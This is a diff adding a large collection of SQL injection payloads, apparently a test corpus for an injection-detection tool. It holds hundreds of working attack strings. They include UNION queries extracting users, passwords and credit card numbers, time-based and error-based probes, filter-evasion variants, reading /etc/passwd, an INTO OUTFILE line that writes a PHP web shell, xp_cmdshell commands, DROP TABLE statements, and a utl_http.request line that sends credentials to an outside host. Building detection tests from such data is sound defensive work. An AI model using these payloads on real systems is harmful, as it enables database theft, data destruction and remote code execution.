@@ -1,0 +1,640 @@
+#
+# Misc collected attacks from the wild and beyond....
+#
+SO_BUY+AND+IF%281%3D1%2CBENCHMARK%281589466%2CMD5%280X41%29%29%2C0%29
+SO_BUY%3B+IF+%281%3D1%29+WAITFOR+DELAY+%2700%3A00%3A01%27--
+SO_BUY+AND%28SELECT+1+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%28%28SELECT+%28SELECT+CONCAT%280X7E%2C0X27%2CDATABASE%28%29%2C0X27%2C0X7E%29%29+FROM+%60INFORMATION_SCHEMA%60.TABLES+LIMIT+0%2C1%29%2CFLOOR%28RAND%280%29%2A2%29%29X+FROM+%60INFORMATION_SCHEMA%60.TABLES+GROUP+BY+X%29A%29+AND+1%3D1
+SO_BUY+AND%28SELECT+1+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%28%28SELECT+%28SELECT+CONCAT%280X7E%2C0X27%2CUNHEX%28HEX%28CAST%28DATABASE%28%29+AS+CHAR%29%29%29%2C0X27%2C0X7E%29%29+FROM+%60INFORMATION_SCHEMA%60.TABLES+LIMIT+0%2C1%29%2CFLOOR%28RAND%280%29%2A2%29%29X+FROM+%60INFORMATION_SCHEMA%60.TABLES+GROUP+BY+X%29A%29+AND+1%3D1
+PHPX+AND+1%3D1+AND+XX%3DX
+PHPX+AND+CHAR%28124%29+USER+CHAR%28124%29%3D0+AND+XX%3DX
+SO_BUY%3B+IF+%281%3D1%29+WAITFOR+DELAY+%2700%3A00%3A01%27--%27
+SO_BUY%27%3B+IF+%281%3D1%29+WAITFOR+DELAY+%2700%3A00%3A01%27--
+materials'%20and%201=1%20and%20''='
+materials'%20and%201=2%20and%20''='
+1'%20and%20char(124)%2Buser%2Bchar(124)=0%20and%20'%25'='
+-999.9'%20UNION%20ALL%20SELECT%200x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536%20and%20'x'='x
+
+# not sql
+#5000224%27%20UNION%20user_id%3E0--
+
+-5000224%27%20UNION%20select%20user_id%20from%20users%20where%20user_id%3E0//
+
+# not sql
+#-5000224%27%20UNION%20user_id%3E0--
+5000224%27%20or%201=1--
+8+and+1=1--
+8+order+by+1--
+8-999.9+union+select+0
+9-999.9+union+select+0--
+6334588%00%27%7C%7CSLEEP%283%29%26%26%271
+6334588%20AND%20BENCHMARK%282999999%2CMD5%28NOW%28%29%29%29
+6334588%26%26SLEEP%283%29
+6334588%27%20AND%20BENCHMARK%282999999%2CMD5%28NOW%28%29%29%29%20AND%20%271
+6334588%27%20AND%20SLEEP%283%29%20AND%20%271
+6402272%27%20%61%6E%64%20%27%36%27%3D%27%356402272%27%20%61%6E%64%20%27%36%27%3D%27%366444930%20%61%6E%64%20%36%3D%35
+6444930%20%61%6E%64%20%36%3D%36
+6444930%27%20%61%6E%64%20%27%36%27%3D%27%35
+6444930%27%20%61%6E%64%20%27%36%27%3D%27%36
+FOO%29%29+AND+UPDATEXML%281025%2CCONCAT%280X2E%2C0X3A7676693A%2C%28SELECT+%28CASE+WHEN+%281025%3D1025%29+THEN+1+ELSE+0+END%29%29%2C0X3A7471773A%29%2C7573%29+AND+%28%283045%3D3045
+1+%2B+%28SELECT+6744+FROM+DUAL+WHERE+3176%3D3176+AND+3761%3D5879%23+%29
+1234.5%29+ORDER+BY+1
+FOO%2C%28SELECT+%28CASE+WHEN+%284831%3D4831%29+THEN+1+ELSE+1%2F%28SELECT+0%29+END%29%29
+FOO%29%3B+IF%28%286681%3D9099%29%2CSELECT+6681%2CDROP+FUNCTION+CGIQ%29%3B%23+AND+%284596%3D4596
+FOO%2C%28SELECT+%28CASE+WHEN+%284763%3D4974%29+THEN+FOO+ELSE+4763%2A%28SELECT+4763+FROM+MYSQL.DB%29+END%29%29
+FOO%29+WHERE+9060%3D9060+AND+UPDATEXML%281025%2CCONCAT%280X2E%2C0X3A7676693A%2C%28SELECT+%28CASE+WHEN+%281025%3D1025%29+THEN+1+ELSE+0+END%29%29%2C0X3A7471773A%29%2C7573%29
+FOO%29%29%29+AND+3787%3DCONVERT%28INT%2C%28CHAR%2858%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28105%29%2BCHAR%2858%29%2B%28SELECT+%28CASE+WHEN+%283787%3D3787%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29
+FOO+%2B+%28SELECT+9350+WHERE+8850%3D8850+AND+3963%3D4777--++%29
+FOO%29+AND+4499%3D8923%23
+FOO%2CIIF%282510%3D9436%2CFOO%2C1%2F0%29
+FOO%29%29%3B+IF%28%288708%3D3788%29%2CSELECT+8708%2CDROP+FUNCTION+RIHR%29%3B%23+AND+%28%286571%3D6571
+FOO%29%29%29%3B+IF%28%289256%3D5702%29%2CSELECT+9256%2CDROP+FUNCTION+IRII%29%3B%23+AND+%28%28%283502%3D350
+%28SELECT+2299%3D%28%27%3AJQA%3A%27%7C%7C%28SELECT+CASE+2299+WHEN+2299+THEN+1+ELSE+0+END+FROM+RDB%24DATABASE%29%7C%7C%27%3AUGJ%3A%27%29%29
+%28SELECT+2811+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280X3A6A71613A%2C%28SELECT+%28CASE+WHEN+%282811%3D2811%29+THEN+1+ELSE+0+END%29%29%2C0X3A75676A3A%2CFLOOR%28RAND%280%29%2A2%29%29X+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+X%29A%29
+FOO%2CEXTRACTVALUE%288571%2CCONCAT%280X5C%2C0X3A7676693A%2C%28SELECT+%28CASE+WHEN+%288571%3D8571%29+THEN+1+ELSE+0+END%29%29%2C0X3A7471773A%29%29
+%28CASE+WHEN+4518%3D5617+THEN+1+ELSE+NULL+END%29
+FOO%29%29%3B+SELECT+PG_SLEEP%285%29%3B--
+FOO%29%29%29%3B+BEGIN+DBMS_LOCK.SLEEP%285%29%3B+END%3B--+AND+%28%28%288410%3D8410
+FOO%29%29+WAITFOR+DELAY+%270%3A0%3A5%27--+AND+%28%282114%3D2114
+FOO%29%29%29+WAITFOR+DELAY+%270%3A0%3A5%27--+AND+%28%28%281285%3D1285
+FOO+WAITFOR+DELAY+%270%3A0%3A5%27--
+1+order+by+1
+FOO%2C%28CAST%28CHR%2858%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%7C%7CCHR%2858%29%7C%7C%28SELECT+%28CASE+WHEN+%281861%3D1861%29+THEN+1+ELSE+0+END%29%29%3A%3ATEXT%7C%7CCHR%2858%29%7C%7CCHR%28116%29%7C%7CCHR%28113%29%7C%7CCHR%28119%29%7C%7CCHR%2858%29+AS+NUMERIC%29%29
+%28SELECT+GENERATE_SERIES%28FOO%2CFOO%2CCASE+WHEN+%289255%3D9830%29+THEN+1+ELSE+0+END%29+LIMIT+1%29
+-999.9+UNION+ALL+SELECT+%27R3DM0V3_HVJ_INJECTION%27%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--
+999999.9+UNION+ALL+SELECT+%27R3DM0V3_HVJ_INJECTION%27%2CNULL--
+-999.9+UNION+ALL+SELECT+%27R3DM0V3_HVJ_INJECTION%27--
+-999.9+UNION+ALL+SELECT+%28SELECT+CAST%28CHAR%28114%29%2BCHAR%2851%29%2BCHAR%28100%29%2BCHAR%28109%29%2BCHAR%2848%29%2BCHAR%28118%29%2BCHAR%2851%29%2BCHAR%2895%29%2BCHAR%28104%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%2895%29%2BCHAR%28105%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%28101%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28111%29%2BCHAR%28110%29+AS+NVARCHAR%284000%29%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--
+999.9+UNION+ALL+SELECT+%28SELECT+CAST%28CHAR%28114%29%2BCHAR%2851%29%2BCHAR%28100%29%2BCHAR%28109%29%2BCHAR%2848%29%2BCHAR%28118%29%2BCHAR%2851%29%2BCHAR%2895%29%2BCHAR%28104%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%2895%29%2BCHAR%28105%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%28101%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28111%29%2BCHAR%28110%29+AS+NVARCHAR%284000%29%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--
+999999.9+UNION+ALL+SELECT+CHR%28114%29%7C%7CCHR%2851%29%7C%7CCHR%28100%29%7C%7CCHR%28109%29%7C%7CCHR%2848%29%7C%7CCHR%28118%29%7C%7CCHR%2851%29%7C%7CCHR%2895%29%7C%7CCHR%28104%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%2895%29%7C%7CCHR%28105%29%7C%7CCHR%28110%29%7C%7CCHR%28106%29%7C%7CCHR%28101%29%7C%7CCHR%2899%29%7C%7CCHR%28116%29%7C%7CCHR%28105%29%7C%7CCHR%28111%29%7C%7CCHR%28110%29--
+CAT1_GALLERY_1+UNION+ALL+SELECT+%28SELECT+CAST%28CHAR%28114%29%2BCHAR%2851%29%2BCHAR%28100%29%2BCHAR%28109%29%2BCHAR%2848%29%2BCHAR%28118%29%2BCHAR%2851%29%2BCHAR%2895%29%2BCHAR%28104%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%2895%29%2BCHAR%28105%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%28101%29%2BCHAR%2899%29%2BCHAR%28116%29%2BCHAR%28105%29%2BCHAR%28111%29%2BCHAR%28110%29+AS+NVARCHAR%284000%29%29%29%2CNULL--
+1 - ORD('A')
+TRUE DIV(SELECT ORD(LEFT
+TRUE DIV(SELECT (ORD(LEFT
+TRUE DIV(SELECT ((ORD(LEFT
+1 DIV(SELECT ORD(LEFT
+1 DIV(SELECT (ORD(LEFT
+0 UNION SELECT (1),2,3
+1 AND (SELECT TOP 10 USERNAME FROM USERS);
+1 AND SELECT 1 FROM T.TRANS_DATE -- 1
+1 AND (SELECT 1 FROM T.TRANS_DATE -- 1
+1 GROUP BY 1 HAVING 1 = 1
+1 GROUP BY 1 HAVING '1' = 1
+1 GROUP BY 1,TRANSID,ACCOUNTID HAVING 1=1
+1 AND SELECT TOP 10 USERNAME FROM USERS -- 1
+1001 union(select userid, ccnumber, '3', '4' from credit_cards)
+1001 union((select userid, ccnumber, '3', '4' from credit_cards))
+1001 union/*/**/*/select userid, ccnumber, '3', '4' from credit_cards
+1001 or 'A' = 'B' union select userid, ccnumber, '3', '4' from credit_cards
+'6334588?'||SLEEP(3)&&'1
+1001*/*!50000(1)union*/all(select 1,ccnumber,3,4 from credit_cards)
+1001*/*!50000(1)union select 1,ccnumber,load_file('/etc/passwd'),4 from credit_cards*/
+(1001)union select-1,ccnumber,3,4 from credit_cards
+(1001)union select (1),ccnumber,3,4 from credit_cards
+(1001)union select @a,ccnumber,3,4 from credit_cards
+1001-\N%0aunion select 1,ccnumber,3,4 from credit_cards
+1001 sounds like '1001' union select 1,ccnumber,3,4 from credit_cards
+1001-'text' union select 1,ccnumber,3,4 from credit_cards
+1001%2b@a union select 1,load_file('/etc/passwd'),3,4 from credit_cards
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001'-@a union select 1,2,3,4 from credit_cards-- -
+'1001'-@a union select 1,2,3,4 from credit_cards
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001 rlike(-1)union select 1,2,3,4 from credit_cards
+## 1001 ----1 union select 1,2,3,4 from credit_cards
+1001 or 'foo' union select 1,2,3,4 from credit_cards
+1001 and @a union select 1,2,3,4 from credit_cards
+1001 like @a-1 union select 1,2,3,4 from credit_cards
+1001-\N-\N union select 1,2,3,4 from credit_cards
+(1001-\N-\N) union select 1,2,3,4 from credit_cards
+(1001-\N)-\N union select 1,2,3,4 from credit_cards
+1001-\N union select 1,2,3,4 from credit_cards
+1001-true union select 1,2,3,4 from credit_cards
+(1001-true) union select 1,2,3,4 from credit_cards
+(1001-'1') union select 1,2,3,4 from credit_cards
+(1001-@version) union select 1,2,3,4 from credit_cards
+1-(1001-true) union select 1,2,3,4 from credit_cards
+1001-false-false union select 1,2,3,4 from credit_cards
+1001-false-NULL union select 1,2,3,4 from credit_cards
+1001 rlike(1-NULL)union select 1,2,3,4 from credit_cards
+1001 rlike(1-(NULL))union select 1,2,3,4 from credit_cards
+(1)-'1' union select 1,2,3,4 from credit_cards
+(1)-@version union select 1,2,3,4 from credit_cards
+(@version)-@version union select 1,2,3,4 from credit_cards
+(@version)-1 union select 1,2,3,4 from credit_cards
+(@version)-'1' union select 1,2,3,4 from credit_cards
+@version-@version union select 1,2,3,4 from credit_cards
+@version-1 union select 1,2,3,4 from credit_cards
+@version-'1' union select 1,2,3,4 from credit_cards
+('1')-'1' union select 1,2,3,4 from credit_cards
+1001 rlike(-1-1)union select 1,2,3,4 from credit_cards
+1001 rlike(1-1)union select 1,2,3,4 from credit_cards
+1001 rlike(@version)union select 1,2,3,4 from credit_cards
+1001 rlike(@version-1)union select 1,2,3,4 from credit_cards
+1001 rlike(1-@version)union select 1,2,3,4 from credit_cards
+1001 rlike('1')union select 1,2,3,4 from credit_cards
+# vv new variations 2013-04-10 nickg vv
+1001 RLIKE ((1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE ((-1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE ((-"1")) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE (-(1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS
+
+# http://vagosec.org/2013/04/mysql-implicit-type-conversion/
+# a'+'b encoded is a%27%2B%27b
+a%27%2B%27b
+' OR 1='1
+
+# new variations
+X' != 'Y' = 0 = '1
+X' = 'X' = 0 = '1
+X' = 'X' = 'X' = 0 = '1
+X' - 'Y' - 0 = '1
+
+# part of parameter pollution
+1) FROM USERS WHERE USERNAME=
+
+# nest pgsql mssql comments
+1/* /*/ */ */ or 1=1-
+1/* /* / */ */ or 1=1-
+
+# small sqli
+1--
+1 --
+1  --
+1/*
+1 /*
+1  /*
+1*1--
+1 * 1--
+1 * 1 --
+1*1/*
+1 * 1/*
+1 * 1 /*
+1 * 1  /*
+@version--
+@@version--
+@version --
+@version /*
+@version/*
+
+# thanks @d0znpp
+(select id from users limit 1,1)
+(select id-0 from users limit 1,1)
+# known bypass.. for now!
+(select id,id,id,id from users limit 1,1)
+
+# some variations
+'1' union (select id from users limit 1,1)
+1 union (select id from users limit 1,1)
+xxx union (select id from users limit 1,1)
+@version union (select id from users limit 1,1)
+
+'1' union (select 1 from users limit 1,1)
+1 union (select 1 from users limit 1,1)
+xxx union (select 1 from users limit 1,1)
+@version union (select 1 from users limit 1,1)
+
+'1' union (select xxx from users limit 1,1)
+1 union (select xxx from users limit 1,1)
+xxx union (select xxx from users limit 1,1)
+@version union (select xxx from users limit 1,1)
+
+'1' union (select 's' from users limit 1,1)
+1 union (select 's' from users limit 1,1)
+xxx union (select 's' from users limit 1,1)
+@version union (select 's' from users limit 1,1)
+
+# thanks @LightOS
+-1 union(((select table_name from information_schema.tables limit 1,1)))
+'1' union(((select table_name from information_schema.tables limit 1,1)))
+@foo union(((select table_name from information_schema.tables limit 1,1)))
+id union(((select table_name from information_schema.tables limit 1,1)))
+
+# and again @LightOS
+test'-1/1/**/union(select table)
+test'-1 union(select table)
+test'-@version union (select table)
+test'-'xyz' union (select table)
+1- @version union(select table_name from information_schema.tables limit 1,1)
+1- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+1- union(select table_name from information_schema.tables limit 1,1)
+@version - @version union(select table_name from information_schema.tables limit 1,1)
+@version- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+@version - 5 union(select table_name from information_schema.tables limit 1,1)
+
+#
+1 into outfile 'asd'
+1 into outfile 'asd'--
+'1' into outfile 'asd'
+'1' into outfile 'asd' --
+@version into outfile 'asd'
+@version into outfile 'asd' --
+
+1 into outfile ('asd')
+'1' into outfile ('asd')
+@version into outfile ('asd')
+
+1 into outfile substring('asd', 10, 1)
+'1' into outfile substring('asd', 10, 1)
+@version into outfile substring('asd', 10 1)
+
+1 into outfile (substring('asd', 10, 1))
+'1' into outfile (substring('asd', 10, 1))
+@version into outfile (substring('asd', 10 1))
+
+%28select+substr%0D%0A%28login%0D%0A%0D%0A%29%0D%0Afrom+users+limit+1%2C1%29
+union%20%28select+id+from+users+limit+1%2C1%29
+
+#
+# This is not valid SQL but designed to force a syntax error
+# http://www.modsecurity.org/testphp.vulnweb.com/listproducts.php?cat=1%0Aand+current_user=notthere()
+1%0Aand+current_user=notthere()
+1%0Aand+current_user=1
+1%0Aand+current_user=@version
+1%0Aand+current_user='junk'
+1%0Aand+current_user=foo
+
+
+
+1--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+@version--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+
+-.1a%20union%20%28select+id+from+users+limit+1%2C1%29
+
+case 1 when 2 then 2 end
+case sin(1) when 2 then 2 end
+case '1' when 2 then 2 end
+case 1 when 's' then 2 end
+case when 2 then 3 end
+case when 's' then 3 end
+case when f(1) then 3 end
+
+-1 union select table_name asda from information_schema.tables
+-1 union select table_name "asda" from information_schema.tables
+-1 union select table_name `asda` from information_schema.tables
+-1 union select table_name as asda from information_schema.tables
+-1 union select table_name as "asda" from information_schema.tables
+-1 union select table_name as `asda` from information_schema.tables
+
+a'and(select(binary(/*!system_user()*/)))like'reading%25
+
+-1 union select @``"", table_name from information_schema.tables
+'foo' union select @``"", table_name from information_schema.tables
+@version union select @``"", table_name from information_schema.tables
+
+select @version foo
+select @version "foo"
+select @version foo -- junk
+select @version "foo" -- junk
+
+$$pgsql evade$$ union select * from foo
+$foo$pgsql evade$foo$ union select * from foo
+
+u&'pgsql evade' union select * from foo
+U&'pgsql evade' union select * from foo
+
+U&'pgsql evade' uescape '!' union select * from foo
+
+_latin1'foo' union select * from foo
+_LATIN7'foo' union select * from foo
+_utf8'foo' union select * from foo
+
+REAL 1 union select * from foo
+1::REAL union select * from foo
+1::REAL::REAL union select * from foo
+
+-1 union select @``"", table_name from information_schema.tables
+!~1 union select table_name from information_schema.tables
+-1 union select @a`from 1`, table_name from information_schema.tables
+version() union select table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+1 is unknown union select table_name from information_schema.tables
+true is not unknown for update union select table_name from information_schema.tables
+1 for update union select 1
+
+# ht/ TK
+(true)-(true)union select table_name from information_schema.tables
+(@a)-(@a)union select table_name from information_schema.tables
+
+# ht/ @stamparm
+1 OR (1 OR 1)--
+(1) OR (1 OR 1)--
+((1) OR (1 OR 1))--
+((1) OR ((1 OR 1)))--
+1 OR ((1 OR 1)) --
+1 OR ((1) OR 1) --
+
+# ht/ @stamparm
+(@x OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- 
+((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x OR (@y) UNION ALL SELECT name,email,password FROM users--
+
+# ht/ @stamparm
+(SELECT 1 FROM DUAL)
+(SELECT @a FROM DUAL) UNION ALL SELECT 1, 2, 3--
+(SELECT (1) FROM DUAL)
+(select @version from dual)
+(select (@version - 1) from dual)
+(select ('foo' - 1) from dual)
+(select 'foo' from dual)
+(select 1 foobar from dual)
+
+# previously had problems with operators made from two words
+# ht/@stamparm
+1 and 1 not between 0 and 1
+1 AND 1 SOUNDS LIKE 1
+1 AND 1 NOT LIKE 0
+
+(1 AND 1) OR 2>1--
+
+# ht/@FluxReiners
+'-(1 or 1) and 1=0 union select load_file('/etc/passwd'),credit_card,password from users-- -
+'-(-1 or -1) and 1=0 union
+'-(-(1) or -1) and 1=0 union
+'-((1) or -1) and 1=0 union
+
+# https://twitter.com/dsrbr/status/342132003270959104
+-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;
+-1 union select null, xmlagg(xmlelement("user",login || ':' || pass).getStringVal() from users;
+-1 union select null, stragg(login || ':' || pass ||', ') from users;
+
+-1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;
+
+#ht ivan
+users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aaa+%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Afrom%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aasdasd
+
+# http://samincube.blogspot.ru/2013/06/time-based-sqli-on-google-coupon.html
+1'=sleep(1)='1
+
+# https://twitter.com/dsrbr/status/343017094926962691
+1 and select (utl_http.request('http://client9.com/') || select listagg(login || chr(58) || pass || ', ') within group  (order by login)  from dual) is not null;
+
+# https://twitter.com/dsrbr/status/341228356936814592
+-1 union select top 1 null, lead(pass, 0) over (order by pass) from users;
+
+# https://twitter.com/dsrbr/status/340018970054766592
+-1 union select null, array_to_json(array_agg(users))::text from users limit 1;
+1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;
+
+# http://www.exploit-db.com/exploits/25915/
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'
+
+# http://blog.detectify.com/post/51651525114/the-ultimate-sql-injection-payload
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+
+# misc secondary sql statements
+1 and true; BEGIN DECLARE @xy varchar(8000)
+1; BEGIN DECLARE @xy varchar(8000)
+x' and 1 = 0; BEGIN DECLARE
+x' AND 1=0; DROP TABLE TMP_DB;
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S
+
+' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE 
+
+# https://twitter.com/st1ll_di3/status/344416764949561346
+# http://pastebin.com/Ymcs7nE0
+(--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -
+
+# example from http://www.websec.ca/kb/sql_injection
+1=1 AND-+-+-+-+~~((1))
+
+# the bizarre sp_password hackery
+1-- foo sp_password
+1'--sp_password
+
+# nice ms-access, courtesy mod-security
+foo' Eqv StrComp(username, 0x12+0x34+0xab+0xcd,0) Imp 'a
+
+# mysql and pgsql string litterals
+b'1' UNION SELECT 1
+x'1' UNION SELECT 1
+n'1' UNION SELECT 1
+
+# ending clauses
+1 having 1 limit 1 union select 1--
+1 having (1) limit 1 union select 1--
+1 having -(1) limit 1 union select 1--
+1 having sin(1) limit 1 union select 1--
+1 having 1 limit 2 group by 3 union select 1--
+1 group by 2 union select 1 --
+sin(1) group by 1 union select 1--
+@version group by 1 union select 1--
+@version group by (-1) union select 1--
+(@version) group by -1 union select 1--
+(@version) group by (-1) union select 1--
+(@version)) group by (-1) union select 1--
+(1)) group by (-1) union select 1--
+(@version) group by sin(-1) union select 1--
+1 group by sin(1) union select 1--
+1 group by 1 - sin(1) union select 1--
+1 group by (sin(1)) union select 1--
+-1 group by -(-sin(1)) union select 1--
+sin(1) group by (-sin(1)) union select 1--
+sin(1)-1 group by (-sin(1)) union select 1--
+sin(1)-1 group by 1 union select 1--
+1 group by ((1)) union select 1--
+1 group by (((1))) union select 1--
+((1)) group by (1) union select 1--
+(1) group by ((1)) union select 1--
+(1) group by (1) union select 1--
+
+# more with 'having'
+-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update  UNION select table_name from information_schema.tables limit 1
+1 for update UNION select table_name from information_schema.tables limit 1
+
+-(1) for update UNION select table_name from information_schema.tables limit 1
+-(true) for update UNION select table_name from information_schema.tables limit 1
+-(null) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update having true UNION select table_name from information_schema.tables limit 1
+-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1
+-(1) having 1 for update UNION select table_name from information_schema.tables limit 1
+
+\''; DROP TABLE users; --
+\''); DROP TABLE users; --
+\''; /* one */ ;DROP TABLE users; --
+\''; select 1; drop table users; --
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+
+EXEC sp_add_job @job_name = 'TestJob';
+EXECUTE sp_add_job @job_name = 'TestJob';
+1;EXECUTE sp_add_job @job_name = 'TestJob';
+1;print 'foo'; exec xp_cmdshell 'destroy';
+
+# nested sub-selects
+-1 - (select (1 - select (select 1))) union all select 2 --
+-1 - (select 1) - union all select 2 --
+(select 1) - 1 union all select 2 --
+((select 1) - 1) + (select 1) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (select ((select 1))) union all select 2 --
+(select ((select 1 - (select 1))) union all select 2 --
+(select (select (((select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (((select (select 1))) union all select 2 --
+(select (select (1 - select 1))) union all select 2 --
+(select (select 1 - (select 1))) union all select 2 --
+(select 1 - (select 1 - (select 1))) union all select 2 --
+
+# moar unions
+-1 union distinct select table_name from information_schema.tables
+-1 union distinct all select table_name from information_schema.tables
+-1 union all distinct select table_name from information_schema.tables
+-1 union all select table_name from information_schema.tables
+
+# more
+if(1, -1, 2) union select table_name from information_schema.tables limit 1
+if((1), -1, 2) union select table_name from information_schema.tables limit 1
+if(1=2, -1, 2) union select table_name from information_schema.tables limit 1
+true in(2, (select 2)) union select table_name from information_schema.tables limit 1
+true in(2, 1) union select table_name from information_schema.tables limit 1
+
+#
+-1 union select current_user``union select table_name from information_schema.tables
+
+if(1, 1, 2) union select 3
+if(sin(1), 1, 2) union select 3
+if(1, sin(1), 2) union select 3
+if(1 - sin(1), 2) union select 3
+if((1), 1, 2) union select 3
+if(-(1), 1, 2) union select 3
+
+#
+1; if exists ( /* anything */
+
+# these aren't SQL but close enough
+union (select 1)--
+union all (select 1)--
+union all (select distinct 1)--
+union (select 1,2,3,4,5)--
+union (select -1,2,3,4,5)--
+union (select -(1),2,3,4,5)--
+union (select -sin(1),2,3,4,5)--
+1;call p(@version, @a)
+1;load data infile "foo"
+1;load xml infile "foo"
+1;load xml local infile "foo"
+1;load xml low_priority infile "foo"
+1;load xml concurrent infile "foo"
+1; delete from foo
+1; delete low_priority from foo
+1; delete quick from foo
+1; delete ignore from foo
+
+
+1;do (1=1)
+
+-0b01 for update union select table_name from information_schema.tables limit 1
+binary _latin1 'true' COLLATE latin1_german2_ci is not unknown union select table_name from information_schema.tables
+binary true COLLATE latin1_german2_ci union select table_name from information_schema.tables
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+binary 1 < binary 2 > binary 3 union select table_name from information_schema.tables limit 1
+
+binary (false) union select table_name from information_schema.tables limit 1
+1 - binary (false) union select table_name from information_schema.tables limit 1
+1 - (binary (false)) union select table_name from information_schema.tables limit 1
+binary binary 1 union select table_name from information_schema.tables
+binary -1 union select table_name from information_schema.tables
+binary -(1) union select table_name from information_schema.tables
